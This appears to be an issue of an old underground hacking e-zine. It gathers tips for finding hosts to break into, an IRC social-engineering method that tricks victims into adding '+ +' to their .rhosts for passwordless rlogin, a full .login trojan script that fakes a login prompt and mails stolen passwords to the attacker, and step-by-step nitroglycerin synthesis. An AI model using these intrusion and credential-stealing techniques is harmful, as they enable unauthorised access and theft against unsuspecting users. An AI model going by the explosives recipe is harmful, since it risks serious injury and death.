Well, here is our first, long awaited issue.  For those of you who don't know
me, I'm Ghost in the Machine.  I've been around the "scene" forever and a
day, and I am quite sick of what it has degenerated into.

This magazine is an attempt to break away from the no-disclosure bullshit
and give everyone all the info they need to do whatever they want to do.
This is an attempt at full-discolure, useful information, while hopefully
remaining entertaining to read.

Submissions for this magazine are accepted from anyone who has the desire to
write an interesting article, and also has the ability to do so. Send your
submissions to:

If you're like me, you will occasionally find yourself bored and want to
find someplace new to hack.  Coming up with a domain that you haven't
already visited might be giving you some headaches, I know it gives them to
me.

Here are some pointers on how to find new systems, what to do once you have
found one to gain easy access (if it exists), and some other neat net tools
that you might not be familiar with.

-
FINDING DOMAINS
-

If you are on a system with any activity at all, you will find it easy to
find new hosts by just checking the processes running on your host.

do a 

% ps -aux | grep telnet

or even better, look at all the processes and pipe it through more.

% ps -aux | more

A lot of times, you will get people telnetting, rlogin'ing etc.. to
different places.. a lot of times they are muds or whatever, which is kinda
lame, but hell, it's someplace to start.

+

% finger @<anotherhost.that.you.know>

This will give you a list of all the people logged in, and many times, where
they are on that host from.  There are usually a handful from someplace
nowhere near the host that you are fingering.

+

Read usenet. Preferrably *security* newsgroups, as often times, stupid
admins will leave valuable system weaknesses in posts, along with their
login name, and host.

+

Jump on to IRC.  Join random, heavily populated channels. Do a 
/who #<channelname> . 

There should be a hefty load of new domains in just that. Some channels that 
usually have a lot of people on domestic machines are:

#talk
#
#warez-#warez9 (these are usually filled with clueless wonders too, always a
good time)
#<any ethnic group you can imagine>

+

Get on the www. Check out where the links are taking you, alas more domains
to play with. Usually chock full of usernames.

+

I'm sure you can come up with plenty of other variations on this theme.
Finding domains is easy, just pick something that appeals to you, and go at
it.



-
USING YOUR NEW DOMAINS
-

Ok, the first thing you might want to do once you find a new domain is scan
it for easily hacked backdoors.  ISS (Internet Security Scanner) is a program
that will do this for you, SATAN is another. I will include a uuencoded gzip 
of ISS 1.21 source with this issue. If you're really bored, you can scan by
hand.

Important Note: Never, NEVER scan a domain with a non-expendable account.
Most of the things that ISS does are easily logged and quite noticable.

+

Question: I have a domain name, but I need the IP address to use with ISS.

Answer: Use nslookup - nslookup is a program that will attach to a
nameserver and translate domain to IP and vice versa. It's very easy to use.

type nslookup

Then at the > prompt, type either fully qualified host names, or ip
addresses. It will spit the info you desire.

+

Question: Is there a way to easily scan a domain for default accounts?
Answer: Yes - netfind

netfind is a handy program for finding accounts without actually entering
the system. It is very versatile, and very helpful.

% man netfind

for complete instructions.

+

These are some easy ways to find stuff. I hope you find them useful.

                                   Terminal
------------------------------------------------------------------------------




The Intro:

By writing this text i intend to share some simple ideas on gaining
accounts, and access on other systems while pissing around on IRC.

I assume, you the reader have a little experience with the commands
of IRC... I dont know why, but I do...

So lets get on with it.

The Beginning:

To find a person on a system of your choice try: /who -host <system name>.
For example: "/who -host *att.com" would find all users on IRC coming
from any host on ATT.COM.. Wildcards are indeed excepted. So find a victim
that way, or if you are less picky, just join any channel, preferably one
with a few users, and do a: "/who *".. that will list all users in the
channel with nick, and mailing address... So, chose a user that looks
interesting, and move on.

The Idea:

Well, we are just trying to accomplish one thing... to get the user to add
"+ +" to his or her .rhosts file.. making any system a 'trusted' host, then
allowing us, to rlogin (Remote Login) to his or her system with no
password... So, we have a few choices.. as you may have seen there are some
popular IRC scripts..IRC scripts are used by many people on IRC for whatever
reason or another. and to get into there system you need only to add a line
to a popular IRC script, or make your own.. the line you would want to add,
would look like this: "exec echo + + > $HOME/.rhosts"... You dont have to
have to give them an IRC script to get them to fix there .rhosts.. with
a stupid user, and a bit of luck, you can have the user type it in himself.
When actually typed while in IRC, you would need to add a '/' to
the whole thing, making it: "/exec echo + + > $HOME/.rhosts"... Once the
'+ +' is added to the .rhosts, you need only, exit to shell.. and type:
"rlogin <victims system> -l <victims username>".For example, to rlogin to
joblo@anysystem.com, you would need to type: "rlogin anysystem.com -l joblo"
from your shell...

The Example:

*Victim* Dude, do you have any IRC scripts??
/whois Victim
*** Victim is victim@any.system.net (John Doe)
*** on channels: #oralsex 
*** on irc via server irc-2.mit.edu ()
/exec echo "exec echo + + > $HOME/.rhosts" >> fenix.irc
/dcc send Victim fenix.irc
*** Sent DCC SEND request to Victim
*** DCC SEND connection to Victim[123.456.0.0,1383] established
*** DCC SEND:/home/myuser/fenix.irc to Victim completed 0.04004 kb/sec         
/msg victim just type: /load fenix.irc
-> *victim* just type: /load fenix.irc
*Victim* Ok, I did... thanks.
/msg victim no problem.
-> *victim* no problem.
/quit I am lame
*** Signoff: me (I am lame)
               
% rlogin any.system.net -l victim

For temporary storage please use /tmp 

You have mail.
ANY% ls
misc_porno    littleboy_nudes
ANY% exit

The Other Idea:

if you want to try something different, You could give out a .login 'trojan'
shell script, that when run replaces the users .login file with a script
wich when the user logs in next, will make it look like the user entered
a wrong login name or password, and will prompt them to reenter it...
What ever is inputed then, is mailed to the address in the script, so
you would want to modify it, with your own mailing address...

You could distribute the script as anything you like, but it isnt an IRC
script, so it needs to be run from the users shell... If you are rlogined
to someones account, you may want to run this on their account to try
and get their passwd...

The Script:

----START SCRIPT----
#!/bin/sh
rm -rf $0
cp $HOME/.login $HOME/.l
echo ''>$HOME/.hushlogin
echo "stty intr '^@'
echo 'Login incorrect'
echo -n 'login: '
echo $<>.t
echo -n 'Password: '
stty -echo
echo $<>>.t
mail yourname@your.mail.account.com<.t
rm .t
cat /etc/motd
mv .l .login
rm .hushlogin
stty echo
source .login">$HOME/.login
----END SCRIPT----

------------------------------------------------------------------------------



         Being the most experienced and knowledgable pyrotechnic in the
state, I figured that it would be in all of our best concerns for me
to write this article, instead of some lame-ass who steals all his
ideas from the Anarchist Cookbook or the Terrorist Handbook without even
trying any of them.  I have made numerous explosives in my time, and now
it is time for me to share them with you.  I will be submitting new
articles to each TYM release, and they will each include one recipe for
some type of explosive.

         First off, I have to say that I am in NO FUCKING WAY responsible
for any dismemberment, or other harm that may come to you or anyone else.
It's not my fault if you picked up this article and decided that you were
a terrorist.  For this reason, I have rated each one twice.   One for
difficulty in making, and one for danger in creating/using it.  So, that's
all I can do to make sure that you dumbasses don't think that nitroglycerin
is easy and fun to make.  So, lets begin.

Nitroglycerin C3H5(NO3)3 -------------------------------
Difficulty level [09]                  Danger level [10]
--------------------------------------------------------
         Nitroglycerin is the most dangerous and most potent explosive
that I am going to teach you in this article.  It is highly volitile to
bumps and jiggles, so I suggest that you merely read this article for the
fun of knowing it, rather than actually making it.  I've only made it a few
times, and got away with it, but for you, it could prove dangerous.

[01] Fill a 75-ml beaker to the 13ml line with fuming red nitric acid, of
         98% concentration.
[02] Place the beaker in an ice bath.  Let it cool down below room
         temperature.
[03] When it's done cooling, add it to 3x the amount of fuming sulfuric
         acid (of 99% concentration).
[04] When done mixing, lower the temperature by adding more ice to the
         bath, to about 10-15øC
[05] When the solution has cooled, it is ready to add glycerin.  Be sure
         to add the glycerin slowing, THROUGH A MEDICINE DROPPER, ONE
         DROP AT A TIME.  Do this carefully, until the entire surface
         of the solution is covered in glycerin.
[06] Nitration will begin as soon as the glycerin is added.  This will
         produce heat, but you MUST keep the solution below 30øC.  If
         it begins to go higher, take the beaker out and pour it in
         the ice bath.  This will prevent an explosion.
[07] For the first 10 minutes of nitration, stir gently.  Normally, a
         layer of nitroglycerin will form on top of it all.
[08] After nitration, the entire beaker should be transferred SLOWLY
         and CAREFULLY to another beaker of water.  The nitroglycerin
         should go to the bottom, and the excess acid and water can
         be drained off.
[09] After removing as much acid as possible (* be sure not to disturb
         the nitroglycerin, it is highly volital at this point *),
         remove the NG with an eyedropper and place it in a sodium
         bicarbonate solution.  This will neutralize most of the
         remaining acid.  Keep doing this step, and testing with
         blue litmus paper until it shows no acid.
[10] Finally, remove the NG from the bicarbonate with an eye dropper.
         Must I remind you to do this SLOWLY and CAREFULLY?

         NG has a very short shelf life, and is extremely unstable.
The best way to keep NG around, is to convert it to dynamite by adding
sawdust, or soap shavings.

Well, I have yet to see a definative guide to UNIX bugs, holes, etc.. with
exploits, so I feel confident that I am not beating a dead horse with this
series.

Everyone seems to want to hack *NIX, and although the majority of bugs,
holes, and other problems are easy to find if you know where to look, most
people do not have any idea where to start looking. This series should give
even the most incurably lame people a starting point.

The current plan is to make this a 4 part series, however, as more and more
goodies show up, one never knows. 



Basically, here is an example for the format of the file:
